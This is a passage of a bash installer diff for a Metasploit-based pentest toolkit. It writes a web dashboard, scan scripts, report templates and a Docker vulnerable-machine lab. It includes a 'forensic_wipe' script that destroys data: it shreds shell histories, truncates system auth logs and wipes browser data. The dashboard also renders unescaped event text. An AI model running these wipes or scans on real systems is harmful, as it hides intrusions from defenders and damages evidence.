+        STATS['uptime'] = str(datetime.now() - datetime.fromisoformat(STATS['started'])).split('.')[0]
+        socketio.sleep(30)
+
+def add_event(event_type, message):
+    STATS['events'].append({'type': event_type, 'msg': message, 'ts': datetime.now().isoformat()})
+    if len(STATS['events']) > 100:
+        STATS['events'] = STATS['events'][-100:]
+    socketio.emit('new_event', {'type': event_type, 'msg': message, 'ts': STATS['events'][-1]['ts']})
+
+@app.route('/')
+def index():
+    return render_template('index.html', stats=STATS)
+
+@app.route('/api/stats')
+def api_stats():
+    return jsonify(STATS)
+
+@app.route('/api/event', methods=['POST'])
+def api_event():
+    data = request.get_json(silent=True) or {}
+    add_event(data.get('type','info'), data.get('msg',''))
+    return jsonify({'status':'ok'})
+
+@app.route('/api/sessions', methods=['POST'])
+def api_sessions():
+    data = request.get_json(silent=True) or {}
+    STATS['sessions'] = data.get('sessions', STATS['sessions'])
+    STATS['hosts'] = data.get('hosts', STATS['hosts'])
+    socketio.emit('stats_update', STATS)
+    return jsonify({'status':'ok'})
+
+@app.route('/health')
+def health():
+    return jsonify({'status':'ok','uptime':STATS['uptime']})
+
+@socketio.on('connect')
+def on_connect():
+    emit('stats_update', STATS)
+
+@socketio.on('ask_ai')
+def on_ask_ai(data):
+    question = data.get('q','')
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        result = subprocess.run(
+            ['bash', os.path.join(script_dir, '../../lib/llm_helper.sh')],
+            input=question, capture_output=True, text=True, timeout=60
+        )
+        emit('ai_response', {'answer': result.stdout or result.stderr or 'No response'})
+    except Exception as e:
+        emit('ai_response', {'answer': f'AI error: {str(e)}'})
+
+def main():
+    port = int(os.environ.get('DASHBOARD_PORT', 8080))
+    print(f"[*] Dashboard starting on http://0.0.0.0:{port}")
+    threading.Thread(target=bg_stats_updater, daemon=True).start()
+    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
+
+if __name__ == '__main__':
+    main()
+PYEOF
+
+    cat > "$D/dashboard/templates/index.html" << 'HTMLEOF'
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MSF Dashboard — Live Operations</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body>
+    <header class="topbar">
+        <h1>⚔️ Metasploit Operations Dashboard</h1>
+        <span id="uptime">⏱ Uptime: --</span>
+    </header>
+
+    <main class="grid-container">
+        <section class="card stat-grid" id="stats-panel">
+            <div class="stat"><span class="stat-num" id="stat-sessions">0</span><span class="stat-label">Sessions</span></div>
+            <div class="stat"><span class="stat-num" id="stat-hosts">0</span><span class="stat-label">Hosts</span></div>
+            <div class="stat"><span class="stat-num" id="stat-services">0</span><span class="stat-label">Services</span></div>
+            <div class="stat"><span class="stat-num" id="stat-vulns">0</span><span class="stat-label">Vulns</span></div>
+            <div class="stat"><span class="stat-num" id="stat-loot">0</span><span class="stat-label">Loot</span></div>
+        </section>
+
+        <section class="card" id="tools-panel">
+            <h2>🛠 Tools Available</h2>
+            <div id="tools-list"></div>
+        </section>
+
+        <section class="card" id="events-panel">
+            <h2>📋 Live Events</h2>
+            <div id="events-feed"></div>
+        </section>
+
+        <section class="card" id="ai-panel">
+            <h2>🤖 AI Assistant</h2>
+            <textarea id="ai-question" placeholder="Ask: What exploits target Apache 2.4.49?" rows="3"></textarea>
+            <button id="ai-ask-btn">▶ Ask AI</button>
+            <pre id="ai-response"></pre>
+        </section>
+
+        <section class="card" id="cmd-panel">
+            <h2>⚡ Quick Actions</h2>
+            <button onclick="quickCmd('health')">🔍 Health Check</button>
+            <button onclick="quickCmd('sessions')">📡 List Sessions</button>
+            <button onclick="quickCmd('snapshot')">📸 Snapshot</button>
+            <button onclick="quickCmd('report')">📊 Generate Report</button>
+        </section>
+    </main>
+
+    <script>
+        const socket = io();
+        socket.on('connect', () => console.log('[WS] Connected'));
+
+        socket.on('stats_update', (data) => {
+            document.getElementById('stat-sessions').textContent = data.sessions;
+            document.getElementById('stat-hosts').textContent = data.hosts;
+            document.getElementById('stat-services').textContent = data.services;
+            document.getElementById('stat-vulns').textContent = data.vulns;
+            document.getElementById('stat-loot').textContent = data.loot;
+            document.getElementById('uptime').textContent = '⏱ Uptime: ' + (data.uptime || '--');
+            const toolsDiv = document.getElementById('tools-list');
+            toolsDiv.innerHTML = Object.entries(data.tools || {}).map(([k,v]) =>
+                `<span class="tool-badge ${v ? 'green' : 'red'}">${k}</span>`).join('');
+        });
+
+        socket.on('new_event', (ev) => {
+            const feed = document.getElementById('events-feed');
+            const div = document.createElement('div');
+            div.className = 'event-item';
+            div.innerHTML = `<span class="event-ts">${new Date(ev.ts).toLocaleTimeString()}</span>
+                             <span class="event-type ${ev.type}">[${ev.type.toUpperCase()}]</span>
+                             <span class="event-msg">${ev.msg}</span>`;
+            feed.prepend(div);
+            if (feed.children.length > 50) feed.lastChild.remove();
+        });
+
+        document.getElementById('ai-ask-btn').addEventListener('click', () => {
+            const q = document.getElementById('ai-question').value.trim();
+            if (!q) return;
+            document.getElementById('ai-response').textContent = 'Thinking...';
+            socket.emit('ask_ai', {q});
+        });
+
+        socket.on('ai_response', (data) => {
+            document.getElementById('ai-response').textContent = data.answer;
+        });
+
+        function quickCmd(action) {
+            fetch('/api/event', {method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({type:'action',msg:`Quick action: ${action} requested`})});
+        }
+
+        // Initial stats load
+        fetch('/api/stats').then(r=>r.json()).then(d=>{socket.emit('stats_update',d);});
+    </script>
+</body>
+</html>
+HTMLEOF
+
+    cat > "$D/dashboard/static/style.css" << 'CSSEOF'
+:root {
+    --bg: #0d1117; --card-bg: #161b22; --border: #30363d;
+    --text: #c9d1d9; --text-dim: #8b949e; --green: #3fb950;
+    --red: #f85149; --blue: #58a6ff; --yellow: #d29922;
+    --purple: #a371f7; --accent: #1f6feb;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
+.topbar { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
+.topbar h1 { font-size: 1.4em; color: var(--green); }
+#uptime { color: var(--text-dim); font-size: 0.9em; }
+.grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 16px; padding: 20px; max-width: 1400px; margin: 0 auto; }
+.card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
+.card h2 { font-size: 1.1em; margin-bottom: 12px; color: var(--blue); }
+.stat-grid { display: flex; justify-content: space-around; }
+.stat { text-align: center; }
+.stat-num { display: block; font-size: 2em; font-weight: 700; color: var(--green); }
+.stat-label { color: var(--text-dim); font-size: 0.85em; }
+.tool-badge { display: inline-block; padding: 4px 10px; margin: 4px; border-radius: 12px; font-size: 0.85em; font-weight: 600; }
+.tool-badge.green { background: #1b3820; color: var(--green); }
+.tool-badge.red { background: #3d1515; color: var(--red); }
+#events-feed { max-height: 300px; overflow-y: auto; }
+.event-item { padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 0.88em; display: flex; gap: 8px; }
+.event-ts { color: var(--text-dim); min-width: 70px; }
+.event-type { font-weight: 700; min-width: 55px; }
+.event-type.info { color: var(--blue); }
+.event-type.warn { color: var(--yellow); }
+.event-type.error { color: var(--red); }
+.event-type.action { color: var(--purple); }
+#ai-question { width: 100%; background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 8px; resize: vertical; }
+#ai-ask-btn { margin-top: 8px; background: var(--accent); color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600; width: 100%; }
+#ai-ask-btn:hover { opacity: 0.85; }
+#ai-response { background: var(--bg); padding: 12px; border-radius: 6px; margin-top: 8px; white-space: pre-wrap; font-size: 0.85em; max-height: 200px; overflow-y: auto; }
+#cmd-panel button { display: block; width: 100%; margin: 6px 0; padding: 8px 12px; background: var(--card-bg); color: var(--text); border: 1px solid var(--border); border-radius: 6px; cursor: pointer; text-align: left; font-size: 0.9em; }
+#cmd-panel button:hover { background: var(--border); }
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+CSSEOF
+    log "dashboard/* (3 files): app.py, templates/index.html, static/style.css written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # SCRIPTS: daily_scan, telegram_notify, generate_report, forensic_wipe, tmux-session (5 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/scripts/daily_scan.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Daily automated recon scan — nmap + nuclei + msf modules
+set -euo pipefail
+TARGET="${1:-}"; OUTPUT_DIR="${2:-$HOME/scan-output/$(date +%Y%m%d)}"
+mkdir -p "$OUTPUT_DIR"
+log()  { echo -e "\033[0;32m[✓]\033[0m $*"; }
+warn() { echo -e "\033[1;33m[!]\033[0m $*"; }
+echo -e "\n=== DAILY SCAN — $(date '+%Y-%m-%d %H:%M') ===\n"
+
+scan_nmap() {
+    log "Phase 1: nmap quick scan..."
+    nmap -sS -T4 --top-ports 1000 "${TARGET:-192.168.1.0/24}" -oA "$OUTPUT_DIR/nmap-quick" 2>&1 | tail -5
+    log "Phase 2: nmap service scan (top targets)..."
+    grep "open" "$OUTPUT_DIR/nmap-quick.gnmap" 2>/dev/null | awk '{print $2}' | sort -u > "$OUTPUT_DIR/live-hosts.txt"
+    local count; count=$(wc -l < "$OUTPUT_DIR/live-hosts.txt" 2>/dev/null || echo 0)
+    [[ "$count" -gt 0 ]] && nmap -sV -sC --top-ports 100 -iL "$OUTPUT_DIR/live-hosts.txt" -oA "$OUTPUT_DIR/nmap-services" 2>&1 | tail -5
+}
+
+scan_nuclei() {
+    log "Phase 3: nuclei vulnerability scan..."
+    [[ "$count" -gt 0 ]] && nuclei -l "$OUTPUT_DIR/live-hosts.txt" -t ~/nuclei-templates/ -severity critical,high -o "$OUTPUT_DIR/nuclei-results.txt" 2>&1 | tail -5 || warn "No hosts to scan"
+}
+
+msf_recon() {
+    log "Phase 4: msfconsole modules..."
+    msfconsole -q -x "
+      db_nmap -sS -T4 --top-ports 100 "${TARGET:-192.168.1.0/24}";
+      hosts; services; vulns;
+      exit;
+    " 2>&1 | tail -10 || warn "msfconsole not available"
+}
+
+generate_summary() {
+    cat > "$OUTPUT_DIR/summary.md" << SUMMD
+# Daily Scan — $(date '+%Y-%m-%d')
+
+| Item | Result |
+|------|--------|
+| Hosts scanned | $(wc -l < "$OUTPUT_DIR/live-hosts.txt" 2>/dev/null || echo 0) |
+| Open ports | $(grep -c "open" "$OUTPUT_DIR/nmap-quick.gnmap" 2>/dev/null || echo 0) |
+| Nuclei findings | $(wc -l < "$OUTPUT_DIR/nuclei-results.txt" 2>/dev/null || echo 0) |
+
+## Top ports
+$(grep "open" "$OUTPUT_DIR/nmap-quick.gnmap" 2>/dev/null | awk '{print $5}' | sed 's/open\///' | sort | uniq -c | sort -rn | head -10)
+SUMMD
+    log "Summary: $OUTPUT_DIR/summary.md"
+}
+
+scan_nmap; scan_nuclei; msf_recon; generate_summary
+echo -e "\n=== SCAN COMPLETE — Output: $OUTPUT_DIR ===\n"
+EOF
+
+    cat > "$D/scripts/telegram_notify.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Telegram notification via Bot API
+set -euo pipefail
+BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"; CHAT_ID="${TELEGRAM_CHAT_ID:-}"
+[[ -z "$BOT_TOKEN" || -z "$CHAT_ID" ]] && { echo "[!] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set in config.env"; exit 0; }
+
+send_telegram() {
+    local text="${1:-Operation completed}"
+    local resp; resp=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+      -d "chat_id=${CHAT_ID}" -d "text=${text}" -d "parse_mode=HTML" 2>/dev/null)
+    local ok; ok=$(echo "$resp" | jq -r '.ok // false' 2>/dev/null)
+    if [[ "$ok" == "true" ]]; then
+        echo "[✓] Telegram sent: $text"
+    else
+        echo "[✗] Telegram failed: $resp"
+    fi
+}
+
+send_file() {
+    local file="$1" caption="${2:-File attached}"
+    [[ ! -f "$file" ]] && { echo "[✗] File not found: $file"; return 1; }
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+      -F "chat_id=${CHAT_ID}" -F "document=@${file}" -F "caption=${caption}" >/dev/null 2>&1 && \
+      echo "[✓] File sent: $file" || echo "[✗] File send failed: $file"
+}
+
+# If called with args, send message
+[[ "${1:-}" != "" ]] && send_telegram "$1"
+[[ "${2:-}" != "" ]] && send_file "$2"
+EOF
+
+    cat > "$D/scripts/generate_report.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Generate pentest report in Markdown + optional PDF via pandoc
+set -euo pipefail
+REPORT_DIR="${1:-$HOME/reports}"; REPORT_DATE; REPORT_DATE=$(date '+%Y-%m-%d')
+REPORT_TITLE="${REPORT_TITLE:-Penetration Testing Report}"
+REPORT_AUTHOR="${REPORT_AUTHOR:-Automated Setup}"
+mkdir -p "$REPORT_DIR"
+OUTFILE="$REPORT_DIR/report_${REPORT_DATE}.md"
+
+cat > "$OUTFILE" << REPORTEOF
+# $REPORT_TITLE
+
+**Date:** $REPORT_DATE
+**Author:** $REPORT_AUTHOR
+**Target:** <specify target>
+**Classification:** CONFIDENTIAL
+
+---
+
+## Executive Summary
+
+This report documents findings from a penetration testing engagement. All activities were authorized under the signed Rules of Engagement.
+
+## Methodology
+
+- Reconnaissance: Passive WHOIS/DNS, active nmap scanning
+- Enumeration: Service version detection, OS fingerprinting
+- Vulnerability Assessment: CVE matching, misconfiguration detection
+- Exploitation: Manual + automated (Metasploit Framework)
+- Post-Exploitation: Privilege escalation, lateral movement, data exfiltration
+- Reporting: Markdown with optional PDF conversion
+
+## Findings Summary
+
+| # | Title | Severity | CVSS | Host | Status |
+|---|-------|----------|------|------|--------|
+| 1 | <Finding> | CRITICAL/HIGH/MEDIUM/LOW | 0.0 | <Host> | Open |
+
+## Detailed Findings
+
+### Finding 1: <Title>
+
+**Severity:** <CRITICAL> | **CVSS:** <0.0> | **CVE:** <CVE-ID>
+
+**Description:** <Description of the vulnerability>
+
+**Affected Hosts:** <IP addresses>
+
+**Proof of Concept:**
+
+\`\`\`bash
+# Steps to reproduce
+\`\`\`
+
+**Impact:** <Business impact>
+
+**Remediation:** <Specific fix steps>
+
+**References:** <Links to CVEs, advisories>
+
+## MITRE ATT&CK Mapping
+
+| Tactic | Technique ID | Technique Name | Evidence |
+|--------|-------------|----------------|----------|
+| Initial Access | T1190 | Exploit Public-Facing Application | <ref> |
+| Execution | T1059 | Command and Scripting Interpreter | <ref> |
+
+## Appendices
+
+### Tool Output Logs
+- nmap scans attached
+- nuclei results attached
+- Metasploit sessions log attached
+
+---
+
+*Report generated by metasploit-installer framework.*
+REPORTEOF
+
+echo "[✓] Report: $OUTFILE"
+
+# Optional PDF via pandoc
+if command -v pandoc &>/dev/null; then
+    pandoc "$OUTFILE" -o "${OUTFILE%.md}.pdf" --pdf-engine=xelatex 2>/dev/null && \
+      echo "[✓] PDF: ${OUTFILE%.md}.pdf" || echo "[!] PDF generation failed — install pandoc + texlive-xetex"
+fi
+EOF
+
+    cat > "$D/scripts/forensic_wipe.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Forensic wipe — secure delete artifacts, clear logs, remove traces
+# ⚠️ ONLY for authorized engagements with explicit cleanup permission
+set -euo pipefail
+TARGET_USER="${1:-}"; WORK_DIR="${2:-/tmp}"
+
+echo -e "\033[1;31m"
+echo "╔══════════════════════════════════════════════════════════════════╗"
+echo "║  ⚠️  FORENSIC WIPE — AUTHORIZED CLEANUP ONLY                     ║"
+echo "║  This script removes ALL traces of pentest activity.             ║"
+echo "║  Requires EXPLICIT permission in Rules of Engagement.            ║"
+echo "╚══════════════════════════════════════════════════════════════════╝"
+echo -e "\033[0m"
+
+echo "[*] Step 1: Clear shell histories..."
+for f in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" "$HOME/.psql_history" "$HOME/.python_history" "$HOME/.node_repl_history"; do
+    [[ -f "$f" ]] && { shred -uz "$f" 2>/dev/null && echo "  [✓] $f" || echo "  [!] $f (rewrite with /dev/null)"; > "$f" 2>/dev/null; }
+done
+
+echo "[*] Step 2: Remove temporary files..."
+for d in /tmp /var/tmp "$WORK_DIR"; do
+    find "$d" -type f \( -name '*.exe' -o -name '*.elf' -o -name '*.ps1' -o -name 'meterpreter*' -o -name 'payload*' \) -user "$(whoami)" -exec shred -uz {} \; 2>/dev/null && echo "  [✓] Cleaned $d"
+done
+
+echo "[*] Step 3: Clear system logs (requires sudo)..."
+if command -v sudo &>/dev/null && sudo -n true 2>/dev/null; then
+    sudo journalctl --rotate 2>/dev/null; sudo journalctl --vacuum-time=1s 2>/dev/null
+    for log in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure; do
+        [[ -f "$log" ]] && sudo truncate -s 0 "$log" 2>/dev/null && echo "  [✓] $log"
+    done
+else
+    echo "  [!] No sudo — system logs preserved"
+fi
+
+echo "[*] Step 4: Clear msfconsole database..."
+msfconsole -q -x "workspace -D; exit;" 2>/dev/null && echo "  [✓] MSF DB dropped" || echo "  [!] msfconsole not active"
+
+echo "[*] Step 5: Remove Metasploit artifacts..."
+rm -rf "$HOME/.msf4/logs" "$HOME/.msf4/loot" "$HOME/.msf4/local" 2>/dev/null
+echo "  [✓] MSF artifacts removed"
+
+echo "[*] Step 6: Clear browser artifacts..."
+for b in "$HOME/.mozilla/firefox" "$HOME/.config/google-chrome" "$HOME/.config/chromium"; do
+    [[ -d "$b" ]] && { find "$b" -name 'Cookies*' -o -name 'History*' -o -name 'Web Data*' -exec shred -uz {} \; 2>/dev/null; echo "  [✓] $b cleared"; }
+done
+
+echo "[*] Step 7: Memory cleanup note..."
+echo "  Reboot recommended to clear in-memory artifacts"
+echo "  Consider: swapoff -a && swapon -a to clear swap"
+
+echo -e "\n=== FORENSIC WIPE COMPLETE ===\n"
+EOF
+
+    cat > "$D/scripts/tmux-session.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Tmux session launcher — 4-pane pentest layout
+set -euo pipefail
+SESSION="${1:-pentest}"; IFACE="${2:-eth0}"; LHOST="${3:-$(hostname -I | awk '{print $1}')}"
+
+log()  { echo -e "\033[0;32m[✓]\033[0m $*"; }
+if ! command -v tmux &>/dev/null; then echo "[!] tmux not installed — apt install tmux"; exit 1; fi
+
+if tmux has-session -t "$SESSION" 2>/dev/null; then
+    echo "[*] Attaching to existing session: $SESSION"
+    tmux attach-session -t "$SESSION"
+    exit 0
+fi
+
+echo "[*] Creating 4-pane pentest layout..."
+
+tmux new-session -d -s "$SESSION" -n "msf"
+# Pane 0 (top-left): msfconsole
+tmux send-keys -t "$SESSION:0.0" "msfconsole -q" C-m
+
+# Pane 1 (top-right): Listener pane
+tmux split-window -h -t "$SESSION:0.0"
+tmux send-keys -t "$SESSION:0.1" "echo '[Listener Pane — Paste handler commands here]'" C-m
+
+# Pane 2 (bottom-left): Recon tools
+tmux split-window -v -t "$SESSION:0.0"
+tmux send-keys -t "$SESSION:0.2" "echo '[Recon Pane — nmap, nikto, enum4linux]'" C-m
+
+# Pane 3 (bottom-right): Log monitor
+tmux split-window -v -t "$SESSION:0.1"
+tmux send-keys -t "$SESSION:0.3" "tail -f \$HOME/metasploit-installer/06-logs/*.log 2>/dev/null || echo '[Monitor Pane]'" C-m
+
+# Tile layout
+tmux select-layout -t "$SESSION:0" tiled
+
+tmux attach-session -t "$SESSION"
+EOF
+    log "scripts/* (5 files) written"
+
+
+    # ──────────────────────────────────────────────────────────────────
+    # LAB: docker-compose.yml + lab-spawn.sh (2 files)
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/lab/docker-compose.yml" << 'YAMLEOF'
+version: '3.8'
+services:
+  dvwa:
+    image: vulnerables/web-dvwa:latest
+    container_name: dvwa-lab
+    ports:
+      - "8081:80"
+    restart: unless-stopped
+    environment:
+      - DB_SERVER=db
+    depends_on:
+      - db
+
+  metasploitable2:
+    image: tleemcjr/metasploitable2:latest
+    container_name: metasploitable2-lab
+    ports:
+      - "8082:80"    # Web
+      - "8083:21"    # FTP
+      - "8084:22"    # SSH
+      - "8085:23"    # Telnet
+      - "8086:25"    # SMTP
+      - "8087:445"   # SMB
+      - "8088:3306"  # MySQL
+      - "8089:5432"  # PostgreSQL
+      - "8090:5900"  # VNC
+    restart: unless-stopped
+
+  kali-desktop:
+    image: docker.io/kalilinux/kali-rolling:latest
+    container_name: kali-attacker
+    command: tail -f /dev/null
+    stdin_open: true
+    tty: true
+    volumes:
+      - kali-data:/root
+      - ./shared:/shared:rw
+    restart: unless-stopped
+
+  db:
+    image: mysql:5.7
+    container_name: dvwa-db
+    environment:
+      MYSQL_ROOT_PASSWORD: p@ssw0rd
+      MYSQL_DATABASE: dvwa
+      MYSQL_USER: dvwa
+      MYSQL_PASSWORD: p@ssw0rd
+    restart: unless-stopped
+
+volumes:
+  kali-data:
+YAMLEOF
+
+    cat > "$D/lab/lab-spawn.sh" << 'EOF'
+#!/usr/bin/env bash
+# Description: Vuln lab spawner — DVWA + Metasploitable2 + Kali
+set -euo pipefail
+LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+ACTION="${1:-up}"
+
+log()  { echo -e "\033[0;32m[✓]\033[0m $*"; }
+warn() { echo -e "\033[1;33m[!]\033[0m $*"; }
+
+if ! command -v docker &>/dev/null; then
+    warn "Docker not installed. Install: sudo apt install docker.io docker-compose"
+    warn "Then: sudo usermod -aG docker $USER"
+    exit 1
+fi
+
+case "$ACTION" in
+    up|start)
+        log "Starting vuln lab..."
+        cd "$LAB_DIR" && docker-compose up -d 2>/dev/null || docker compose up -d 2>/dev/null
+        log "Lab running! Targets:"
+        echo "  DVWA:            http://localhost:8081"
+        echo "  Metasploitable2: http://localhost:8082"
+        echo "  MS2 SSH:         localhost:8084 (user: msfadmin / pass: msfadmin)"
+        echo "  MS2 Telnet:      localhost:8085 (user: msfadmin / pass: msfadmin)"
+        echo "  MS2 SMB:         localhost:8087"
+        echo "  Kali attacker:   docker exec -it kali-attacker bash"
+        ;;
+    down|stop)
+        log "Stopping vuln lab..."
+        cd "$LAB_DIR" && docker-compose down 2>/dev/null || docker compose down 2>/dev/null
+        ;;
+    status)
+        docker ps --filter "name=dvwa" --filter "name=metasploitable2" --filter "name=kali-attacker"
+        ;;
+    *)
+        echo "Usage: bash lab-spawn.sh [up|down|status]"
+        ;;
+esac
+EOF
+    log "lab/* (2 files) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # COLLAB: lock.target (1 file) — Team collision prevention
+    # ──────────────────────────────────────────────────────────────────
+    cat > "$D/collab/lock.target" << 'EOF'
+# Collaborative Mode Lock File
+# Created by setup.sh — prevents team member collision on targets
+# Format: <TARGET_IP> <TIMESTAMP> <USER>
+# Example: 192.168.1.50 2026-07-24T14:00:00Z alice
+#
+# Rules:
+#   - Claim target by appending: echo "<IP> $(date -Iseconds) $(whoami)" >> lock.target
+#   - Release: sed -i '/^<IP> /d' lock.target
+#   - Check before attacking: grep "^<IP> " lock.target && echo "LOCKED" || echo "FREE"
+#   - Stale locks (>2 hours) auto-expire on next msf-run.sh module run
+#   - Locks honored by: msf-run.sh, msf-pentest-framework.sh, all modules
+#
+# ⚠️  DO NOT ATTACK A LOCKED TARGET — coordination violation
+# ⚠️  RELEASE YOUR LOCK immediately after engagement
+EOF
+    log "collab/* (1 file) written"
+
+    # ──────────────────────────────────────────────────────────────────
+    # FINAL: Close populate_all_files() function
+    # ──────────────────────────────────────────────────────────────────
+    chmod +x "$D"/*.sh 2>/dev/null || true
+    chmod +x "$D"/modules/**/*.sh 2>/dev/null || true
+    chmod +x "$D"/scripts/*.sh 2>/dev/null || true
+    chmod +x "$D"/lib/*.sh 2>/dev/null || true
+    mark_done "populate_all_files"
+    log "=== populate_all_files() COMPLETE — all files written to disk ==="
+}
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 6: ORCHESTRATION — do_full_install(), main(), Git lifecycle, final output
+# ──────────────────────────────────────────────────────────────────────────────
+
+# ──────────────────────────────────────────────────────────────────
+# do_full_install() — Complete automated installation pipeline
+# ──────────────────────────────────────────────────────────────────
+do_full_install() {
+    local start_time; start_time=$(date +%s)
+    title "═══════════════════════════════════════════════════════════════"
+    title "  METASPLOIT INSTALLER — FULL AUTOMATED INSTALLATION"
+    title "═══════════════════════════════════════════════════════════════"
+    echo ""
+    info "Mode: ${USER_MODE} | Distro: ${DISTRO_ID} (${OS_FAMILY}) | Arch: ${ARCH}"
+    info "Install dir: ${INSTALL_DIR}"
+    info "Starting full install pipeline..."
+    echo ""
+
+    # 1. Idempotency check + backup
+    step "Phase 1/11: Idempotency Check"
+    check_idempotency || return 1
+
+    # 2. Snapshot before changes
+    step "Phase 2/11: Pre-install Snapshot"
+    take_snapshot "pre"
+
+    # 3. Create directory structure
+    step "Phase 3/11: Directory Structure"
+    create_directory_structure
+
+    # 4. Populate all files (heredoc extraction)
+    step "Phase 4/11: File Population"
+    populate_all_files
+
+    # 5. Install system dependencies
+    step "Phase 5/11: System Dependencies"
+    do_install_deps
+
+    # 6. Install Go tools
+    step "Phase 6/11: Go Tools"
+    install_go_tools
+
+    # 7. Install Python tools
+    step "Phase 7/11: Python Tools"
+    install_python_tools
+
+    # 8. Install Metasploit Framework
+    step "Phase 8/11: Metasploit Framework"
+    do_install_metasploit
+
+    # 9. Install Dashboard
+    step "Phase 9/11: Web Dashboard"
+    install_dashboard
+
+    # 10. Setup PATH persistence
+    step "Phase 10/11: PATH Configuration"
+    setup_path
+
+    # 11. Post-install verification
+    step "Phase 11/11: Verification & Reporting"
+    generate_report
+    run_smoke_test
+    do_snapshot_diff "pre" "post"
+
+    local end_time; end_time=$(date +%s)
+    local duration=$((end_time - start_time))
+    local mins=$((duration / 60))
+    local secs=$((duration % 60))
+
+    # Git lifecycle
+    auto_git_lifecycle
+
+    # Final success banner
+    print_final_banner "${mins}m ${secs}s"
+    mark_done "full_install"
+}
+
+# ──────────────────────────────────────────────────────────────────
+# auto_git_lifecycle() — Initialize repo, commit, push if configured
+# ──────────────────────────────────────────────────────────────────
+auto_git_lifecycle() {
+    step "Git Lifecycle Automation"
+
+    # Check if git already initialized
+    if [[ -d "$INSTALL_DIR/.git" ]]; then
+        info "Git repository already exists — skipping init"
+    else
+        if command -v git &>/dev/null; then
+            info "Initializing git repository..."
+            git -C "$INSTALL_DIR" init 2>/dev/null && log "Git init complete" || warn "Git init failed"
+        else
+            warn "git not installed — skipping Git lifecycle"
+            return
+        fi
+    fi
+
+    # Create .gitignore if not exists
+    if [[ ! -f "$INSTALL_DIR/.gitignore" ]]; then
+        cat > "$INSTALL_DIR/.gitignore" << 'GITIGNORE'
+# Metasploit Installer - Auto-generated .gitignore
+.env
+config.env
+*.log
+*.tmp
+*.pid
+*.state
+.cache/
+06-logs/
+.vscode/
+.idea/
+*.swp
+*.bak
+*.orig
+.DS_Store
+Thumbs.db
+GITIGNORE
+        log ".gitignore created"
+    fi
+
+    # Add all files
+    info "Staging changes..."
+    git -C "$INSTALL_DIR" add . 2>/dev/null || warn "git add failed"
+
+    # Commit if there are changes
+    if ! git -C "$INSTALL_DIR" diff --cached --quiet 2>/dev/null; then
+        local commit_msg="feat: full install $(date '+%Y-%m-%d %H:%M')"
+        info "Committing: $commit_msg"
+        git -C "$INSTALL_DIR" commit -m "$commit_msg" 2>/dev/null && log "Commit complete" || warn "Commit failed"
+    else
+        info "No changes to commit"
+    fi
+
+    # Push if GITHUB_REPO_URL is set and AUTO_PUSH=true
+    if [[ -n "${GITHUB_REPO_URL:-}" && "${AUTO_PUSH:-false}" == "true" ]]; then
+        info "Pushing to $GITHUB_REPO_URL..."
+        git -C "$INSTALL_DIR" remote get-url origin 2>/dev/null || \
+            git -C "$INSTALL_DIR" remote add origin "$GITHUB_REPO_URL" 2>/dev/null
+        git -C "$INSTALL_DIR" push -u origin main 2>/dev/null && log "Push complete" || warn "Push failed — check credentials/remote"
+    else
+        [[ -z "${GITHUB_REPO_URL:-}" ]] && info "GITHUB_REPO_URL not set — skipping push"
+        [[ "${AUTO_PUSH:-false}" != "true" ]] && info "AUTO_PUSH=false — skipping push"
+    fi
+}
+
+# ──────────────────────────────────────────────────────────────────
+# audit_self() — Self-audit all files and dependencies
+# ──────────────────────────────────────────────────────────────────
+audit_self() {
+    step "Self-Audit & Validation"
+    local audit_log="$INSTALL_DIR/06-logs/audit_self_$(date +%Y%m%d_%H%M%S).log"
+    mkdir -p "$INSTALL_DIR/06-logs"
+
+    {
+        echo "=== METASPLOIT INSTALLER SELF-AUDIT ==="
+        echo "Timestamp: $(date -Iseconds)"
+        echo "Install Dir: $INSTALL_DIR"
+        echo ""
+
+        echo "── File Inventory ──"
+        find "$INSTALL_DIR" -type f -name "*.sh" | sort | while IFS= read -r f; do
+            local size; size=$(wc -l < "$f")
+            echo "$f ($size lines)"
+        done
+        echo ""
+
+        echo "── Syntax Check (bash -n) ──"
+        local syntax_ok=0 syntax_fail=0
+        find "$INSTALL_DIR" -type f -name "*.sh" | while IFS= read -r f; do
+            if bash -n "$f" 2>/dev/null; then
+                echo "  [✓] $f"
+                ((syntax_ok++))
+            else
